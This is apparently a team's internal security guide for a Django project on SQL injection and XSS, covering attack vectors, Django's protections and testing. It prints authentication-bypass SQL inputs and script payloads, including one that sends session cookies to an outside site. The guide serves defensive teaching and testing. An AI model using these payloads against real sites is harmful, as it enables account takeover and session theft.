# SQL Injection: Overview and Application in Django

## What is SQL Injection?

SQL Injection is a type of cyber attack where malicious SQL code is inserted into an input field, which is then executed by the database. This allows attackers to bypass authentication, access, modify, and delete data within the database.

### Common Attack Vectors

1. **User Input Fields**: Attackers exploit input fields like login forms, search boxes, or any other form that interacts with the database.
2. **Cookies**: If server-side scripts do not validate cookie data, attackers can manipulate cookie values for SQL injection.
3. **HTTP Headers**: Attackers can insert SQL commands into HTTP headers like User-Agent or Referer.
4. **URL Parameters**: URLs that directly interact with databases are vulnerable if not properly sanitized.

### Example Attack

Consider a login form where the SQL query is:

```
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```

An attacker might input:

Username: ```' OR '1'='1```     
Password: ``' OR '1'='1``

This manipulates the SQL to:

```
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1';
```

This query will always return true, allowing the attacker to bypass authentication.

## SQL Injection in Django

Django, a popular web framework, includes several built-in protections against SQL Injection:

- **ORM (Object-Relational Mapping):** Django’s ORM automatically escapes inputs, preventing direct SQL injection.
- **Parameterization:** Queries in Django use parameterization, which ensures that user inputs are treated as data, not executable code.
- **Validation:** Django validates and sanitizes inputs, reducing the risk of SQL injection.

## Best Practices in Our Project

Given that our project uses Django, to maintain these protections on should make sure of the following:

- **Avoid Raw SQL:** Stick to Django ORM. If raw SQL is necessary, always use parameterized queries.
- **Sanitize Input:** Ensure that all user inputs are properly validated and sanitized.
- **Regular Updates:** Keep Django and its dependencies up-to-date to mitigate any known vulnerabilities.

## How to Test for SQL Injection

1. **Manual Testing:** Input common SQL injection payloads (`' OR 1=1 --`) into input fields and observe the behavior.
2. **Automated Tools:** Use tools like SQLMap to automate testing for SQL injection vulnerabilities.
3. **Code Review:** During code reviews make sure to pay attention to areas where raw SQL or user inputs are handled.

# Cross-Site Scripting (XSS): Overview and Application in Django

## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a type of security vulnerability that allows an attacker to inject malicious scripts (usually JavaScript) into web pages viewed by other users. These scripts can execute in the context of the victim's browser, enabling the attacker to steal information, impersonate the user, or perform actions on their behalf.

## Common Attack Vectors

- **User Input Fields**: Attackers inject scripts into fields like forms or comment sections that are displayed back to users without proper sanitization.
- **URLs**: Scripts can be injected through URL parameters if they are reflected on the page.
- **Third-Party Widgets**: Vulnerable third-party content integrated into a site can become an XSS vector.

## Example Attack

Consider an input form where users can submit a tournament name and description. An attacker might submit the following:

- **Tournament Name:**
```
<script>alert('Busted')</script>
```

If the input is not properly sanitized, this script will execute in the browser of anyone who views the tournament page, displaying an alert box with the message "Busted".

A more dangerous example could be:

- **Tournament Name:** 
```
<script>window.location = 'https://yourBank.com?cookie=' + document.cookie</script>
```

This script could redirect the user to a malicious site and steal their session cookies.

## XSS in Django

Django provides several mechanisms to protect against XSS:

- **Automatic Escaping**: Django templates automatically escape variables to prevent script injection.
- **Safe Markup**: When outputting HTML that includes user input, use `mark_safe` with caution, and only after sanitizing input.
- **Form Validation**: Django’s form validation helps ensure that inputs do not contain harmful scripts.

## Best Practices in Our Project

Given the potential for XSS attacks, ensure the following practices:

- **Input Sanitization**: Sanitize all user inputs before displaying them.
- **Use Django's Built-in Protections**: Rely on Django’s template system to escape variables and prevent direct script injection.
- **Content Security Policy (CSP)**: Implement a strong Content Security Policy to restrict the sources from which scripts can be executed.

## How to Test for XSS

- **Manual Testing**: Insert test scripts like `<script>alert('Test')</script>` in various input fields and check if they are executed.
- **Automated Scanners**: Use tools like OWASP ZAP to identify XSS vulnerabilities.
- **Code Review**: During code reviews, ensure that all dynamic content is properly escaped or sanitized.

